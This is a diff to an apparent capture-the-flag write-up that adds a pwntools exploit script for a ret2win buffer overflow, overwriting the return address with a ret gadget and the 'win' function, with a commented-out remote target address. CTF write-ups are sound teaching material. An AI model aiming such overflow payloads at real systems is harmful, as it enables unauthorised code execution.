@@ -32,6 +32,24 @@ And then, just like common `ret2win`, I got the flag.<br>
 #### Exploit
 Here's my full exploit.<br>
 <br>
-<img width="633" height="395" alt="image" src="https://github.com/user-attachments/assets/30c59576-3ee1-4c69-96ed-881d28f0bda3" /><br>
+```python
+from pwn import *
+
+elf = context.binary = ELF('./echo')
+io = process('./echo')
+#io = remote('34.116.80.78', 9998)
+rop = ROP(elf)
+
+win_addr = elf.sym['win']
+ret_addr = rop.find_gadget(['ret'])[0]
+offset = 0x48
+
+payload = b'a' * 0x48
+payload += p64(ret_addr)
+payload += p64(win_addr)
+
+io.sendline(payload)
+io.interactive()
+```
 <br>
 That's it
